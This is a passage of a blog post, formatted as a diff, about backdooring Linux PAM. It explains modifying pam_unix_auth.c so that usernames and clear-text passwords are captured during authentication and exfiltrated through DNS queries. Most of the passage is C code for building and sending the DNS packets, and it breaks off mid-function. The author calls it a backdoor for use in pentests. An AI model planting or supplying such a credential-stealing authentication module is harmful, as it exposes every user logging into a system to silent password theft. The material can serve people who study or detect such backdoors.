+<h2 id="0x01-modifying-pam_unix_authc">0x01 Modifying pam_unix_auth.c</h2>
+
+<p>        
+<em>(We are not going to explain what is PAM or how it works. To get a deeper information about PAM, use</em> <code class="language-plaintext highlighter-rouge">man</code><em>).</em></p>
+
+<p>        
+In order to retrieve the user and password in clear text we are going to <strong>replace the valid pam_unix.so</strong> module to one modified by us. If we check the source code of the original module (download the source code of the PAM version installed in your target server from <a href="http://www.linux-pam.org/library/">here</a>), we can see at the pam_unix_auth.c file a function called pam_sm_authenticate, and inside this function a call to <strong>_unix_verify_password</strong> which arguments are the username and password used in the authentication:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// (...)</span>
+	<span class="cm">/* verify the password of this user */</span>
+	<span class="n">retval</span> <span class="o">=</span> <span class="n">_unix_verify_password</span><span class="p">(</span><span class="n">pamh</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="n">ctrl</span><span class="p">);</span>
+	<span class="n">name</span> <span class="o">=</span> <span class="n">p</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+
+	<span class="n">AUTH_RETURN</span><span class="p">;</span>
+<span class="err">}</span>
+<span class="c1">// (...)</span>
+</code></pre></div></div>
+<p>        
+So looks fine to inject our exfiltration logic at this point. As PoC, we can use <a href="https://gist.github.com/fffaraz/9d9170b57791c28ccda9255b48315168">this snippet of code (Silver Moon - 29/4/2009)</a>, so the main exfiltration logic is implemented yet (this code has some bugs -for example it does not take the server IP from resolv.conf-… so if you are going to use it in a real pentest, reimplement the code ;D). Lets vim the pam_unix_auth.c file to add the functions and headers needed!:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* Fun starts here :)
+
+ * pam_sm_authenticate() performs UNIX/shadow authentication
+ *
+ *      First, if shadow support is available, attempt to perform
+ *      authentication using shadow passwords. If shadow is not
+ *      available, or user does not have a shadow password, fallback
+ *      onto a normal UNIX authentication
+ */</span>
+<span class="cm">/* Backdoor  - DNS code extracted from https://gist.github.com/fffaraz/9d9170b57791c28ccda9255b48315168 */</span>
+
+
+<span class="c1">// The code sucks a lot. It is Sunday and I have a hangover, so I am not in the mood to fix it. </span>
+<span class="c1">// Tons of bug and useless code that you should remove. Forgive me, please :)</span>
+
+<span class="cp">#include &lt;sys/socket.h&gt;
+#include &lt;arpa/inet.h&gt;
+#include &lt;netinet/in.h&gt;
+</span>
+<span class="c1">//List of DNS Servers registered on the system</span>
+<span class="kt">char</span> <span class="n">dns_servers</span><span class="p">[</span><span class="mi">10</span><span class="p">][</span><span class="mi">100</span><span class="p">];</span>
+<span class="kt">int</span> <span class="n">dns_server_count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="c1">//Types of DNS resource records :)</span>
+ 
+<span class="cp">#define T_A 1 //Ipv4 address
+#define T_NS 2 //Nameserver
+#define T_CNAME 5 // canonical name
+#define T_SOA 6 </span><span class="cm">/* start of authority zone */</span><span class="cp">
+#define T_PTR 12 </span><span class="cm">/* domain name pointer */</span><span class="cp">
+#define T_MX 15 //Mail server
+</span> 
+<span class="c1">//Function Prototypes</span>
+<span class="kt">void</span> <span class="nf">ngethostbyname</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="p">,</span> <span class="kt">int</span><span class="p">);</span>
+<span class="kt">void</span> <span class="nf">ChangetoDnsNameFormat</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span><span class="p">,</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span><span class="p">);</span>
+<span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="nf">ReadName</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span><span class="p">,</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span><span class="p">,</span><span class="kt">int</span><span class="o">*</span><span class="p">);</span>
+<span class="kt">void</span> <span class="nf">get_dns_servers</span><span class="p">();</span>
+ 
+<span class="c1">//DNS header structure</span>
+<span class="k">struct</span> <span class="n">DNS_HEADER</span>
+<span class="p">{</span>
+    <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">id</span><span class="p">;</span> <span class="c1">// identification number</span>
+ 
+    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">rd</span> <span class="o">:</span><span class="mi">1</span><span class="p">;</span> <span class="c1">// recursion desired</span>
+    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">tc</span> <span class="o">:</span><span class="mi">1</span><span class="p">;</span> <span class="c1">// truncated message</span>
+    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">aa</span> <span class="o">:</span><span class="mi">1</span><span class="p">;</span> <span class="c1">// authoritive answer</span>
+    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">opcode</span> <span class="o">:</span><span class="mi">4</span><span class="p">;</span> <span class="c1">// purpose of message</span>
+    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">qr</span> <span class="o">:</span><span class="mi">1</span><span class="p">;</span> <span class="c1">// query/response flag</span>
+ 
+    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">rcode</span> <span class="o">:</span><span class="mi">4</span><span class="p">;</span> <span class="c1">// response code</span>
+    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">cd</span> <span class="o">:</span><span class="mi">1</span><span class="p">;</span> <span class="c1">// checking disabled</span>
+    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">ad</span> <span class="o">:</span><span class="mi">1</span><span class="p">;</span> <span class="c1">// authenticated data</span>
+    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">z</span> <span class="o">:</span><span class="mi">1</span><span class="p">;</span> <span class="c1">// its z! reserved</span>
+    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">ra</span> <span class="o">:</span><span class="mi">1</span><span class="p">;</span> <span class="c1">// recursion available</span>
+ 
+    <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">q_count</span><span class="p">;</span> <span class="c1">// number of question entries</span>
+    <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">ans_count</span><span class="p">;</span> <span class="c1">// number of answer entries</span>
+    <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">auth_count</span><span class="p">;</span> <span class="c1">// number of authority entries</span>
+    <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">add_count</span><span class="p">;</span> <span class="c1">// number of resource entries</span>
+<span class="p">};</span>
+ 
+<span class="c1">//Constant sized fields of query structure</span>
+<span class="k">struct</span> <span class="n">QUESTION</span>
+<span class="p">{</span>
+    <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">qtype</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">qclass</span><span class="p">;</span>
+<span class="p">};</span>
+ 
+<span class="c1">//Constant sized fields of the resource record structure</span>
+<span class="cp">#pragma pack(push, 1)
+</span><span class="k">struct</span> <span class="n">R_DATA</span>
+<span class="p">{</span>
+    <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">type</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">_class</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">ttl</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">data_len</span><span class="p">;</span>
+<span class="p">};</span>
+<span class="cp">#pragma pack(pop)
+</span> 
+<span class="c1">//Pointers to resource record contents</span>
+<span class="k">struct</span> <span class="n">RES_RECORD</span>
+<span class="p">{</span>
+    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">R_DATA</span> <span class="o">*</span><span class="n">resource</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">rdata</span><span class="p">;</span>
+<span class="p">};</span>
+ 
+<span class="c1">//Structure of a Query</span>
+<span class="k">typedef</span> <span class="k">struct</span>
+<span class="p">{</span>
+    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">QUESTION</span> <span class="o">*</span><span class="n">ques</span><span class="p">;</span>
+<span class="p">}</span> <span class="n">QUERY</span><span class="p">;</span>
+
+<span class="cm">/*
+ * Perform a DNS query by sending a packet
+ * */</span>
+<span class="kt">void</span> <span class="nf">ngethostbyname</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">host</span> <span class="p">,</span> <span class="kt">int</span> <span class="n">query_type</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">65536</span><span class="p">],</span><span class="o">*</span><span class="n">qname</span><span class="p">,</span><span class="o">*</span><span class="n">reader</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">i</span> <span class="p">,</span> <span class="n">j</span> <span class="p">,</span> <span class="n">stop</span> <span class="p">,</span> <span class="n">s</span><span class="p">;</span>
+ 
+    <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">a</span><span class="p">;</span>
+ 
+    <span class="k">struct</span> <span class="n">RES_RECORD</span> <span class="n">answers</span><span class="p">[</span><span class="mi">20</span><span class="p">],</span><span class="n">auth</span><span class="p">[</span><span class="mi">20</span><span class="p">],</span><span class="n">addit</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span> <span class="c1">//the replies from the DNS server</span>
+    <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">dest</span><span class="p">;</span>
+ 
+    <span class="k">struct</span> <span class="n">DNS_HEADER</span> <span class="o">*</span><span class="n">dns</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">QUESTION</span> <span class="o">*</span><span class="n">qinfo</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+ 
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Resolving %s"</span> <span class="p">,</span> <span class="n">host</span><span class="p">);</span>
+ 
+    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span> <span class="p">,</span> <span class="n">SOCK_DGRAM</span> <span class="p">,</span> <span class="n">IPPROTO_UDP</span><span class="p">);</span> <span class="c1">//UDP packet for DNS queries</span>
+ 
+    <span class="n">dest</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
+    <span class="n">dest</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mi">53</span><span class="p">);</span>
+    <span class="n">dest</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">inet_addr</span><span class="p">(</span><span class="n">dns_servers</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span> <span class="c1">//dns servers</span>
+ 
+    <span class="c1">//Set the DNS structure to standard queries</span>
+    <span class="n">dns</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">DNS_HEADER</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">;</span>
+ 
+    <span class="n">dns</span><span class="o">-&gt;</span><span class="n">id</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">short</span><span class="p">)</span> <span class="n">htons</span><span class="p">(</span><span class="n">getpid</span><span class="p">());</span>
+    <span class="n">dns</span><span class="o">-&gt;</span><span class="n">qr</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">//This is a query</span>
+    <span class="n">dns</span><span class="o">-&gt;</span><span class="n">opcode</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">//This is a standard query</span>
+    <span class="n">dns</span><span class="o">-&gt;</span><span class="n">aa</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">//Not Authoritative</span>
+    <span class="n">dns</span><span class="o">-&gt;</span><span class="n">tc</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">//This message is not truncated</span>
+    <span class="n">dns</span><span class="o">-&gt;</span><span class="n">rd</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="c1">//Recursion Desired</span>
+    <span class="n">dns</span><span class="o">-&gt;</span><span class="n">ra</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">//Recursion not available! hey we dont have it (lol)</span>
+    <span class="n">dns</span><span class="o">-&gt;</span><span class="n">z</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">dns</span><span class="o">-&gt;</span><span class="n">ad</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">dns</span><span class="o">-&gt;</span><span class="n">cd</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">dns</span><span class="o">-&gt;</span><span class="n">rcode</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">dns</span><span class="o">-&gt;</span><span class="n">q_count</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> <span class="c1">//we have only 1 question</span>
+    <span class="n">dns</span><span class="o">-&gt;</span><span class="n">ans_count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">dns</span><span class="o">-&gt;</span><span class="n">auth_count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">dns</span><span class="o">-&gt;</span><span class="n">add_count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+ 
+    <span class="c1">//point to the query portion</span>
+    <span class="n">qname</span> <span class="o">=</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">[</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">DNS_HEADER</span><span class="p">)];</span>
+ 
+    <span class="n">ChangetoDnsNameFormat</span><span class="p">(</span><span class="n">qname</span> <span class="p">,</span> <span class="n">host</span><span class="p">);</span>
+    <span class="n">qinfo</span> <span class="o">=</span><span class="p">(</span><span class="k">struct</span> <span class="n">QUESTION</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">[</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">DNS_HEADER</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">strlen</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">qname</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)];</span> <span class="c1">//fill it</span>
+ 
+    <span class="n">qinfo</span><span class="o">-&gt;</span><span class="n">qtype</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span> <span class="n">query_type</span> <span class="p">);</span> <span class="c1">//type of the query , A , MX , CNAME , NS etc</span>
+    <span class="n">qinfo</span><span class="o">-&gt;</span><span class="n">qclass</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> <span class="c1">//its internet (lol)</span>
+ 
+    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Sending Packet..."</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span> <span class="n">sendto</span><span class="p">(</span><span class="n">s</span><span class="p">,(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">buf</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">DNS_HEADER</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">strlen</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">qname</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">QUESTION</span><span class="p">),</span><span class="mi">0</span><span class="p">,(</span><span class="k">struct</span> <span class="n">sockaddr</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">dest</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="n">dest</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">perror</span><span class="p">(</span><span class="s">"sendto failed"</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Done"</span><span class="p">);</span>
+     
+    <span class="c1">//Receive the answer</span>
+    <span class="n">i</span> <span class="o">=</span> <span class="k">sizeof</span> <span class="n">dest</span><span class="p">;</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Receiving answer..."</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">recvfrom</span> <span class="p">(</span><span class="n">s</span><span class="p">,(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">buf</span> <span class="p">,</span> <span class="mi">65536</span> <span class="p">,</span> <span class="mi">0</span> <span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">dest</span> <span class="p">,</span> <span class="p">(</span><span class="n">socklen_t</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">i</span> <span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">perror</span><span class="p">(</span><span class="s">"recvfrom failed"</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Done"</span><span class="p">);</span>
+ 
+    <span class="n">dns</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">DNS_HEADER</span><span class="o">*</span><span class="p">)</span> <span class="n">buf</span><span class="p">;</span>
+ 
+    <span class="c1">//move ahead of the dns header and the query field</span>
+    <span class="n">reader</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">[</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">DNS_HEADER</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">strlen</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">qname</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">QUESTION</span><span class="p">)];</span>
+ 
+    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">The response contains : "</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s"> %d Questions."</span><span class="p">,</span><span class="n">ntohs</span><span class="p">(</span><span class="n">dns</span><span class="o">-&gt;</span><span class="n">q_count</span><span class="p">));</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s"> %d Answers."</span><span class="p">,</span><span class="n">ntohs</span><span class="p">(</span><span class="n">dns</span><span class="o">-&gt;</span><span class="n">ans_count</span><span class="p">));</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s"> %d Authoritative Servers."</span><span class="p">,</span><span class="n">ntohs</span><span class="p">(</span><span class="n">dns</span><span class="o">-&gt;</span><span class="n">auth_count</span><span class="p">));</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s"> %d Additional records.</span><span class="se">\n\n</span><span class="s">"</span><span class="p">,</span><span class="n">ntohs</span><span class="p">(</span><span class="n">dns</span><span class="o">-&gt;</span><span class="n">add_count</span><span class="p">));</span>
+ 
+    <span class="c1">//Start reading answers</span>
+    <span class="n">stop</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
+ 
+    <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">ntohs</span><span class="p">(</span><span class="n">dns</span><span class="o">-&gt;</span><span class="n">ans_count</span><span class="p">);</span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">answers</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">name</span><span class="o">=</span><span class="n">ReadName</span><span class="p">(</span><span class="n">reader</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="o">&amp;</span><span class="n">stop</span><span class="p">);</span>
+        <span class="n">reader</span> <span class="o">=</span> <span class="n">reader</span> <span class="o">+</span> <span class="n">stop</span><span class="p">;</span>
+ 
+        <span class="n">answers</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">resource</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">R_DATA</span><span class="o">*</span><span class="p">)(</span><span class="n">reader</span><span class="p">);</span>
+        <span class="n">reader</span> <span class="o">=</span> <span class="n">reader</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">R_DATA</span><span class="p">);</span>
+ 
+        <span class="k">if</span><span class="p">(</span><span class="n">ntohs</span><span class="p">(</span><span class="n">answers</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">resource</span><span class="o">-&gt;</span><span class="n">type</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="c1">//if its an ipv4 address</span>
+        <span class="p">{</span>
+            <span class="n">answers</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">rdata</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">ntohs</span><span class="p">(</span><span class="n">answers</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">resource</span><span class="o">-&gt;</span><span class="n">data_len</span><span class="p">));</span>
+ 
+            <span class="k">for</span><span class="p">(</span><span class="n">j</span><span class="o">=</span><span class="mi">0</span> <span class="p">;</span> <span class="n">j</span><span class="o">&lt;</span><span class="n">ntohs</span><span class="p">(</span><span class="n">answers</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">resource</span><span class="o">-&gt;</span><span class="n">data_len</span><span class="p">)</span> <span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span>
+            <span class="p">{</span>
+                <span class="n">answers</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">rdata</span><span class="p">[</span><span class="n">j</span><span class="p">]</span><span class="o">=</span><span class="n">reader</span><span class="p">[</span><span class="n">j</span><span class="p">];</span>
+            <span class="p">}</span>
+ 
+            <span class="n">answers</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">rdata</span><span class="p">[</span><span class="n">ntohs</span><span class="p">(</span><span class="n">answers</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">resource</span><span class="o">-&gt;</span><span class="n">data_len</span><span class="p">)]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>
+ 
+            <span class="n">reader</span> <span class="o">=</span> <span class="n">reader</span> <span class="o">+</span> <span class="n">ntohs</span><span class="p">(</span><span class="n">answers</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">resource</span><span class="o">-&gt;</span><span class="n">data_len</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">else</span>
+        <span class="p">{</span>
+            <span class="n">answers</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">rdata</span> <span class="o">=</span> <span class="n">ReadName</span><span class="p">(</span><span class="n">reader</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="o">&amp;</span><span class="n">stop</span><span class="p">);</span>
+            <span class="n">reader</span> <span class="o">=</span> <span class="n">reader</span> <span class="o">+</span> <span class="n">stop</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+ 
+    <span class="c1">//read authorities</span>
+    <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">ntohs</span><span class="p">(</span><span class="n">dns</span><span class="o">-&gt;</span><span class="n">auth_count</span><span class="p">);</span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">auth</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">name</span><span class="o">=</span><span class="n">ReadName</span><span class="p">(</span><span class="n">reader</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="o">&amp;</span><span class="n">stop</span><span class="p">);</span>
+        <span class="n">reader</span><span class="o">+=</span><span class="n">stop</span><span class="p">;</span>
+ 
+        <span class="n">auth</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">resource</span><span class="o">=</span><span class="p">(</span><span class="k">struct</span> <span class="n">R_DATA</span><span class="o">*</span><span class="p">)(</span><span class="n">reader</span><span class="p">);</span>
+        <span class="n">reader</span><span class="o">+=</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">R_DATA</span><span class="p">);</span>
+ 
+        <span class="n">auth</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">rdata</span><span class="o">=</span><span class="n">ReadName</span><span class="p">(</span><span class="n">reader</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="o">&amp;</span><span class="n">stop</span><span class="p">);</span>
+        <span class="n">reader</span><span class="o">+=</span><span class="n">stop</span><span class="p">;</span>
+    <span class="p">}</span>
+ 
+    <span class="c1">//read additional</span>
+    <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">ntohs</span><span class="p">(</span><span class="n">dns</span><span class="o">-&gt;</span><span class="n">add_count</span><span class="p">);</span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">addit</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">name</span><span class="o">=</span><span class="n">ReadName</span><span class="p">(</span><span class="n">reader</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="o">&amp;</span><span class="n">stop</span><span class="p">);</span>
+        <span class="n">reader</span><span class="o">+=</span><span class="n">stop</span><span class="p">;</span>
+ 
+        <span class="n">addit</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">resource</span><span class="o">=</span><span class="p">(</span><span class="k">struct</span> <span class="n">R_DATA</span><span class="o">*</span><span class="p">)(</span><span class="n">reader</span><span class="p">);</span>
+        <span class="n">reader</span><span class="o">+=</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">R_DATA</span><span class="p">);</span>
+ 
+        <span class="k">if</span><span class="p">(</span><span class="n">ntohs</span><span class="p">(</span><span class="n">addit</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">resource</span><span class="o">-&gt;</span><span class="n">type</span><span class="p">)</span><span class="o">==</span><span class="mi">1</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="n">addit</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">rdata</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">ntohs</span><span class="p">(</span><span class="n">addit</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">resource</span><span class="o">-&gt;</span><span class="n">data_len</span><span class="p">));</span>
+            <span class="k">for</span><span class="p">(</span><span class="n">j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">j</span><span class="o">&lt;</span><span class="n">ntohs</span><span class="p">(</span><span class="n">addit</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">resource</span><span class="o">-&gt;</span><span class="n">data_len</span><span class="p">);</span><span class="n">j</span><span class="o">++</span><span class="p">)</span>
+            <span class="n">addit</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">rdata</span><span class="p">[</span><span class="n">j</span><span class="p">]</span><span class="o">=</span><span class="n">reader</span><span class="p">[</span><span class="n">j</span><span class="p">];</span>
+ 
+            <span class="n">addit</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">rdata</span><span class="p">[</span><span class="n">ntohs</span><span class="p">(</span><span class="n">addit</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">resource</span><span class="o">-&gt;</span><span class="n">data_len</span><span class="p">)]</span><span class="o">=</span><span class="sc">'\0'</span><span class="p">;</span>
+            <span class="n">reader</span><span class="o">+=</span><span class="n">ntohs</span><span class="p">(</span><span class="n">addit</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">resource</span><span class="o">-&gt;</span><span class="n">data_len</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">else</span>
+        <span class="p">{</span>
